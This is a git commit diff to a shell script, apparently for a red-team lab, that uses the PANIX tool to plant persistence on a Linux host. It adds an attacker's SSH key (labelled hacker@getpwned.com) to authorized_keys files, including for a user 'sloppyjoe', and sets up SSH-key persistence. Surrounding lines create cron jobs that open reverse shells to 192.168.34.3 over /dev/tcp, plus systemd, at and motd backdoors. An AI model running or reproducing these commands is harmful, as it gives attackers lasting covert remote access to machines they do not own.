b50491109601f9f4b3c486479ecbb5c9788a3258
Graymos <142538040+Graymos@users.noreply.github.com>
2024-11-05 20:32:24 -0600

    Added sloppyjoe auth keys and ssh key

--- totally-innocent-not-start-of-persistence.sh
+++ totally-innocent-not-start-of-persistence.sh
@@ -13,8 +13,10 @@ bash /tmp/totally-innocent/panix.sh -q --systemd --default --ip 192.168.34.3 --p
 bash /tmp/totally-innocent/panix.sh -q --at --default --ip 192.168.34.3 --port 4446 --time "now + 24 hours" >/dev/null
  
 # authorized_keys persistence
+##authorized_keys for user
 bash /tmp/totally-innocent/panix.sh -q --authorized-keys --default --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDubTGnY3TWk4ycUJg9E+VpkjCp1hcim4XdVioWtTUOf hacker@getpwned.com" >/dev/null
-
+##authorized_keys for sloppyjoe (needs sudo)
+bash /tmp/totally-innocent/panix.sh -q --authorized-keys --custom --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDubTGnY3TWk4ycUJg9E+VpkjCp1hcim4XdVioWtTUOf hacker@getpwned.com" --path /home/sloppyjoe/.ssh/authorized_keys
 #cron   
 bash /tmp/totally-innocent/panix.sh --cron --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4447 0>&1'" --daily --name "evil_cron_job" >/dev/null
  
@@ -23,8 +25,13 @@ bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * root /b
 bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * /bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4449 0>&1'" --crontab >/dev/null
 
 #motd
-sudo ./panix.sh --motd --default --ip 192.168.34.3 --port 4450
+bash /tmp/totally-innocent/panix.sh --motd --default --ip 192.168.34.3 --port 4450
 
+#ssh-key
+##for sloppy joe
+bash /tmp/totally-innocent/panix.sh --ssh-key --cutom --user sloppyjoe
+##for default in case not sudo
+bash /tmp/totally-innocent/panix.sh --ssh-key --default
 
 
  
